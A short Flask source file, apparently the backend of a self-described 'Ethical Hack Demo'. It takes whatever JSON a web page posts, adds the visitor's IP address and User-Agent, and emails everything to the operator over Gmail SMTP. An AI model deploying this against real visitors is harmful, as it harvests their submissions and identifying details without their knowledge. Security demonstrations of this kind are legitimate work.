import os
from flask import Flask, request, render_template
import smtplib
from email.message import EmailMessage

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    data = request.json
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")

    body = "Collected Data from Ethical Demo:\\n\\n"
    for key, value in data.items():
        body += f"{key}: {value}\\n"
    body += f"\\nIP Address: {ip}\\nUser-Agent: {user_agent}"

    EMAIL = os.environ.get("EMAIL")
    PASSWORD = os.environ.get("EMAIL_PASSWORD")

    msg = EmailMessage()
    msg.set_content(body)
    msg["Subject"] = "[Ethical Hack Demo] Collected Data"
    msg["From"] = EMAIL
    msg["To"] = EMAIL

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(EMAIL, PASSWORD)
        server.send_message(msg)

    return "✅ Data sent to your email successfully!"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Default to 5000 for local use
    app.run(host="0.0.0.0", port=port)

